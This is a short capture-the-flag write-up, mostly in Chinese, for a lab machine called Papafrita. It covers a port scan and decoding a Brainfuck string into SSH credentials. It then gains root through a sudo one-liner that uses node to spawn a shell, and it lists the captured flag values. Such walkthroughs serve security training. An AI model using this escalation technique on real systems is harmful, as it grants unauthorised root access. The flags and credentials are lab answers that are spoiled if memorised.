# Papafrita

2025.03.08 https://thehackerslabs.com/papafrita/

[video]()

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

80 web 首页源代码发现 brainfuck：

```
++++++++++[>++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>++++++++++>++++++++++>++++++++++>+++++++++++>+++++++++++>++++++++++>+++++++++++>++++++++++++>++++++++++>+++++++++++>++++++++++>++++++++++++>+++++++++++>+++++++++++>++++++++++<<<<<<<<<<<<<<<<<<<<-]>---.>--.>---.>+.>--.>---.>-.>---.>--.>-----.>+.>.>----.>---.>--.>---.>-----.>+.>++.>---.
```

解密得到: abuelacalientalasopa 可以分解成 abuela:calientalasopa 或者是 abuela:abuelacalientalasopa 尝试进行 ssh 登陆，发现 abuela:abuelacalientalasopa 能够登陆。

sudo -l 显示 (root) NOPASSWD: /usr/bin/node

```
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

最终拿到 2 个 flag：

```
# cat user.txt
f3e431cd1129e9879e482fcb2cc151e8
# cat /root/root.txt
7e69e6849ca2dac8fc1e4cdf9f7b915f
```
